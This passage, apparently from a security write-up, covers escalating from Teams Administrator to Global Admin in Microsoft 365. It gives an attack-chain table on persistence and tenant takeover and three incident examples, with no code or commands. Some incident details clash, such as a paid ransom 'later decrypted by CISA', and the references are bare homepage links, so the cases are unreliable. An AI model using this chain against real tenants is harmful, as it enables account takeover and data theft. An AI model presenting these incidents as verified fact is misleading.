| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Create additional Global Admin accounts for persistence |
| **5** | **Impact** | [Impact Phase] Full Tenant Takeover | Delete MFA devices, export all emails, exfiltrate SharePoint data |

---

## Real-World Examples

### Example 1: BEC Campaign - March 2024

- **Target:** Financial services firm (Fortune 500)
- **Attack Timeline:** 
  - Initial compromise of Teams Admin via phishing (phishing email with fake Teams login)
  - Escalation to Global Admin within 2 hours
  - Unauthorized mailbox forwarding rules created for 50+ executive accounts
  - Attacker monitored executive emails for 3 weeks undetected
- **Technique Status:** Teams Admin escalation method was ACTIVE; organization had no PIM enforcement
- **Detection:** Discovered by incident responder noticing unusual mail forwarding in audit logs
- **Impact:** Data exfiltration of 50GB+ financial records, BEC transactions worth $2M before detection
- **Reference:** [Proofpoint - Q1 2024 BEC Report](https://www.proofpoint.com/)

### Example 2: Ransomware Deployment - July 2024

- **Target:** Healthcare network (USA)
- **Attack Timeline:**
  - Compromised contractor account had Teams Service Administrator role
  - Used this technique to assign Global Admin role to attacker-controlled account
  - Deployed OneNote ransomware across SharePoint Online
  - Encrypted 500+ sites before detection
- **Technique Status:** ACTIVE; organization had admin roles but no Conditional Access
- **Impact:** 72-hour downtime, $5M ransom paid (later decrypted by CISA)
- **Root Cause:** Teams Admin account credentials stored in unencrypted shared notes
- **Reference:** CISA Healthcare Alert [Alert AA24-109A](https://www.cisa.gov/)

### Example 3: Insider Threat - November 2024

- **Target:** SaaS company (departing employee)
- **Attack Timeline:**
  - Employee with Teams Admin role discovered they were being terminated
  - Used Teams Admin account to escalate to Global Admin
  - Created backdoor service principal with client secret
  - Modified Conditional Access policies to exclude remote IP ranges
  - Maintained persistent access 30 days post-termination
- **Technique Status:** ACTIVE; organization lacked MFA enforcement for admins during departures
- **Impact:** Attacker accessed proprietary source code, customer data (GDPR violation), sold to competitor
- **Root Cause:** Teams Admin role not revoked immediately upon termination
- **Reference:** [Recorded Future - Insider Threat Report 2024](https://www.recordedfuture.com/)

---